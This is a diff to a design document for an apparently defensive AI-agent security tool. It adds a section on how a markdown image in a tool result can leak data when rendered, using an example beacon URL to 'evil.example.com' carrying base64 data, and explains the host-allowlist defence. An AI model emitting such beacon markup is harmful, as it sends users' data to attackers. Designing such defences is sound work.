@@ -850,6 +850,77 @@ from 607 to 723 tokens per request, 19% more, because French is longer than
 English. That is the price of the standards being readable by the team that
 wrote them, stated rather than hidden.
 
+### The output that exfiltrates by being looked at
+
+A tool result comes back carrying one line:
+
+```markdown
+![](https://evil.example.com/p.gif?d=c2VjcmV0LXBheWxvYWQ)
+```
+
+Nothing instructs the agent to send anything, so `injection.exfiltration` — which
+looks for a *request* to send data — has nothing to match. The moment a client
+renders that text, in a chat panel, an editor preview or a dashboard, the
+renderer fetches that uniform resource locator (URL) and its query string
+arrives in somebody else's access log. The renderer is the courier.
+
+**The payload cannot be the signal, and finding that out is the whole design.**
+A beacon carrying `?s=AKIAIOSFODNN7EXAMPLE` was already caught — by
+`global.aws_access_key`, because the stolen value happened to look like a key.
+That is luck. The same beacon carrying base64 matched nothing at all.
+
+So three ways of making the payload the signal were tried and dropped, each for
+a reason this project had already paid for once:
+
+| Rejected | Why |
+|---|---|
+| A length threshold on the query string | Removing `injection.hidden_text` taught exactly this: **their threshold was the bypass**. A beacon under the limit is a beacon. |
+| Enumerating parameter names (`d`, `s`, `data`, `log`) | The attacker picks the name, so the space is infinite. This is the mistake the dependency rules stopped making. |
+| Neutralising by default | It edits text a person is going to read, and the settled rule here is that glyphless characters may be stripped and meaning-bearing content may not. |
+
+What survives has nothing to bypass: **an allowlist of hosts whose untrusted
+content may fetch itself.** That is the Content Security Policy model, and the
+reason it holds is that it never reasons about the payload at all. A host is on
+the list or it is not.
+
+```yaml
+render:
+  allow_hosts: [img.shields.io]   # badges stay silent
+  neutralise: false               # note it, or stop it
+```
+
+The list ships **empty** rather than carrying an opinion, because allowing a
+host means trusting it not to forward — and a badge service with a `?url=`
+endpoint would launder exactly what this is meant to catch. That is an operator
+decision, so the operator makes it.
+
+Enumerating the *forms* is not the mistake that was rejected, and the
+difference is worth stating because it looks identical. A parameter name is the
+attacker's to choose. The set of constructs a renderer fetches without being
+asked belongs to HyperText Markup Language (HTML): finite, published, the same
+for everyone. Enumerating it
+is the move that works, the way enumerating shell metacharacters works.
+
+**Two tiers**, the shape the rug pull already uses. *Noted* by default — the
+hosts are named, in the agent's note and in the decision record, and not one
+byte of the output is touched. *Neutralised* on `render.neutralise: true`, for
+an operator who knows their clients render untrusted markdown:
+
+```text
+![alt](https://evil.example.com/p.gif?d=…)   ->  [alt](https://evil.example.com/p.gif?d=…)
+<img src="https://evil.example.com/p.gif">   ->  <img data-ai-bunker-blocked-src="…">
+```
+
+**Nothing is deleted.** Every URL stays readable and every edit is reversible by
+a human, which is what makes it a defensible thing to do to somebody's
+document — and it is still an edit, which is why it is off until asked for.
+
+The note names the **host** and never the URL. A beacon's query string *is* the
+stolen data, and repeating it would put the exfiltrated bytes into the context
+window a second time while explaining that they were being stolen. The decision
+record follows the same rule and keeps the destination, which is the one fact an
+incident needs: somebody has to be told where it was going.
+
 ### The tool that was approved, and then changed
 
 Screening a tool declaration catches what it *says*. It cannot catch a server
@@ -1770,7 +1841,7 @@ Nothing above is a claim about shipped code unless this table says so.
 | `ai_bunker/sizing.py` + `report.py` — roofline model, catalogue, CLI | ✅ |
 | `docs/SIZING.md` — the buying decision, costed | ✅ |
 | `ai_bunker/budget.py` — server-side token accounting, itemised and gated | ✅ |
-| 1037 tests, `ruff` clean | ✅ |
+| 1071 tests, `ruff` clean | ✅ |
 | `scripts/lint_acronyms.py` — every abbreviation spelled out before use | ✅ |
 | `ai_bunker/budget.py` — server-side token accounting | ✅ |
 | `ai_bunker/charter.py` — index, pages on demand, fingerprint | ✅ |
